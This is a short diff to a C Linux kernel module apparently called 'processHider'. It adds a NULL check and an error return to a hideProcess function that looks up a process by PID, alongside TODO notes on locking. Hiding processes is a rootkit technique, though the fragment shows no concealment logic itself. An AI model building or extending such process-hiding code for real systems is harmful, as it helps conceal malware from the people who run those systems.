@@ -29,8 +29,12 @@ void processHider_exit(void) {
 }
 
 
+//returns error code...
 static int hideProcess(int pidNumber) {
 	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
+	if (pid == NULL) {
+		return 1;
+	}
 	
 	rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 	
